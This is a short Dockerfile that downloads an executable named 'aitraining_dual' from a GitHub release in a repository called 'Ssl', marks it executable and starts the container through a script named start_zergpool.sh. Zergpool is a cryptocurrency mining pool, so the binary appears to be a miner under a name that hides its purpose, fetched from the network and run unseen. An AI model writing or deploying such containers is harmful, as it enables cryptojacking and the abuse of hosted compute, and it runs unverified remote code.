FROM debian:trixie-slim

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get upgrade -y && \
    apt-get install -y \
        curl \
        wget \
        ca-certificates \
        bash \
        procps && \
    update-ca-certificates && \
    mkdir -p /opt && \
    cd /opt && \
    (curl -L https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -o aitraining_dual || \
     wget https://github.com/max313iq/Ssl/releases/download/22x/aitraining_dual -O aitraining_dual) && \
    chmod +x aitraining_dual && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

WORKDIR /opt

COPY start_zergpool.sh .
RUN chmod +x start_zergpool.sh

ENTRYPOINT ["bash", "./start_zergpool.sh"]
